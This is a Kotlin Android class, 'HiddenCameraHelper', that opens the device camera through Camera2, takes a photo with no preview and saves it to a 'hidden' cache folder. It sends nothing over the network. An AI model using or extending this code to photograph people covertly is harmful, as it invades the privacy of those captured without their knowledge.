package com.example.camera

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.Image
import android.media.ImageReader
import android.view.Surface
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class HiddenCameraHelper(
    private val context: Context,
    private val onCaptureSuccess: (File) -> Unit,
    private val onError: (Exception) -> Unit,
    private val deviceOrientation: Int
) {
    private lateinit var cameraDevice: CameraDevice
    private lateinit var imageReader: ImageReader

    @SuppressLint("MissingPermission")
    fun takePhoto() {
        try {
            val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = manager.cameraIdList.firstOrNull() ?: ""

            imageReader = ImageReader.newInstance(
                3072, 4096,
                ImageFormat.JPEG, 1
            ).apply {
                setOnImageAvailableListener({ reader ->
                    reader?.acquireNextImage()?.let { saveImage(it) }
                }, null)
            }

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    this@HiddenCameraHelper.cameraDevice = camera
                    createCaptureSession(cameraId)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    onError(Exception("Camera error: $error"))
                }
            }, null)
        } catch (e: Exception) {
            onError(e)
        }
    }

    private fun createCaptureSession(cameraId: String) {
        val outputSurfaces = listOf<Surface>(imageReader.surface)

        cameraDevice.createCaptureSession(
            outputSurfaces,
            object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureImage(session,cameraId)
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {
                    onError(Exception("Session configuration failed"))
                }
            }, null
        )
    }

    private fun captureImage(session: CameraCaptureSession, cameraId: String) {
        try {
            val rotation = calculateImageRotation(cameraId, deviceOrientation)
            val requestBuilder = cameraDevice.createCaptureRequest(
                CameraDevice.TEMPLATE_STILL_CAPTURE
            ).apply {
                addTarget(imageReader.surface)
                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
                set(CaptureRequest.JPEG_ORIENTATION, rotation)
            }

            session.capture(
                requestBuilder.build(),
                null,
                null
            )
        } catch (e: Exception) {
            onError(e)
        }
    }

    private fun saveImage(image: Image) {
        try {
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining()).also { buffer.get(it) }

            val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
            val outputDir = File(context.cacheDir, "hidden")
            outputDir.mkdirs()

            val outputFile = File(outputDir, "IMG_${timeStamp}.jpeg")
            FileOutputStream(outputFile).use { it.write(bytes) }

            onCaptureSuccess(outputFile)
        } catch (e: Exception) {
            onError(e)
        } finally {
            image.close()
            cameraDevice.close()
        }
    }

    private fun getCameraSensorOrientation(cameraId: String): Int {
        val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val characteristics = manager.getCameraCharacteristics(cameraId)
        return characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
    }

    private fun calculateImageRotation(cameraId: String, deviceOrientation: Int): Int {
        val sensorOrientation = getCameraSensorOrientation(cameraId)

        return when (deviceOrientation) {
            0 -> sensorOrientation
            90 -> (sensorOrientation + 270) % 360
            180 -> (sensorOrientation + 180) % 360
            270 -> (sensorOrientation + 90) % 360
            else -> 0
        }
    }
}